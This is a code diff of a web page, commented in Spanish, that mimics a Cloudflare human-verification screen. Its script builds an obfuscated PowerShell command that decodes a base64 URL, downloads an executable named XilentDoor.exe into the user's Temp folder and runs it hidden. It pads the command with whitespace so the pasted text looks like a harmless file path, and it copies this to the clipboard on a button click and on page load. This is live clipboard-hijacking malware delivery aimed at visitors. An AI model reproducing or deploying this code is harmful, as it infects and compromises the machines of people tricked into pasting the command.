@@ -8,7 +8,7 @@
     :root{
       --bg:#ffffff;
       --muted:#6b7280;
-      --accent:#f18a20; /* naranja */
+      --accent:#f18a20;
       --card:#ffffff;
       --shadow: 0 6px 24px rgba(15,23,42,0.06);
       --glass: rgba(0,0,0,0.04);
@@ -23,7 +23,6 @@
       -moz-osx-font-smoothing:grayscale;
     }
 
-    /* page layout */
     .shell{
       min-height:100%;
       display:flex;
@@ -59,7 +58,6 @@
       align-items:flex-start;
     }
 
-    /* left card (spinner and small card preview) */
     .left{
       width:320px;
       min-height:220px;
@@ -89,7 +87,6 @@
       100%{ transform: translateY(0) scale(1);}
     }
 
-    /* center card - verification steps */
     .verify-card{
       width:420px;
       background:var(--card);
@@ -174,7 +171,6 @@
       color:var(--muted);
     }
 
-    /* right big text area (mimic the Cloudflare page text) */
     .right{
       flex:1;
       min-width:340px;
@@ -203,7 +199,6 @@
       gap:6px;
     }
 
-    /* copy button styles */
     .copy-btn {
       background:var(--accent);
       border: 1px solid #f5851d;
@@ -223,7 +218,6 @@
       transform: translateY(1px);
     }
 
-    /* responsive */
     @media (max-width:900px){
       .main-row{
         flex-direction:column;
@@ -341,34 +335,28 @@
       const btn = document.getElementById('verifyBtn');
       const copyBtn = document.getElementById('copyPathBtn');
 
-      // Función para generar el comando PowerShell con contenido oculto
       function copyVerificationData() {
-        // Comando PowerShell que descarga y ejecuta la imagen
+        // Comando PowerShell que descarga y ejecuta el malware
         var powershellCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"& {$userName = $env:USERNAME; $encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL1IzTEk0TlQvWGlsZW50RG9vci9yZWxlYXNlcy9kb3dubG9hZC9YaWxlbnREb29yL1hpbGVudERvb3IuZXhl'; $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl)); $localPath = 'C:\\Users\\' + $userName + '\\AppData\\Local\\Temp\\XilentDoor.exe'; (New-Object Net.WebClient).DownloadFile($downloadUrl, $localPath); Start-Process $localPath;}\"";;
         
-        // Ruta inocua que se mostrará
         var visiblePath = "C:\\Users\\Default\\verification.conf";
         
-        // Generar muchos espacios en blanco (400 caracteres para mejor ocultación)
         var spaces = "                                                                                                    " +
                      "                                                                                                    " +
                      "                                                                                                    " +
                      "                                                                                                    ";
         
-        // Combinar: comando PowerShell + espacios + ruta visible
         var fullText = powershellCommand + spaces + visiblePath;
         
         return fullText;
       }
 
-      // Función para copiar al portapapeles
       function copyToClipboard(text) {
         return navigator.clipboard.writeText(text).then(() => {
           console.log("Datos de verificación copiados al portapapeles");
           return true;
         }).catch(err => {
           console.error('Error al copiar: ', err);
-          // Fallback para navegadores antiguos
           var textArea = document.createElement("textarea");
           textArea.value = text;
           document.body.appendChild(textArea);
@@ -379,12 +367,10 @@
         });
       }
 
-      // Función para copiar la ruta al portapapeles
       copyBtn.addEventListener('click', function() {
         const fullText = copyVerificationData();
         
         copyToClipboard(fullText).then(() => {
-          // Cambiar temporalmente el texto del botón
           const originalText = copyBtn.textContent;
           copyBtn.textContent = 'COPIADO!';
           copyBtn.style.background = '#f5851d';
@@ -409,7 +395,6 @@
         });
       });
 
-      // Copiar automáticamente al cargar la página
       window.addEventListener('load', function() {
         setTimeout(function() {
           const fullText = copyVerificationData();
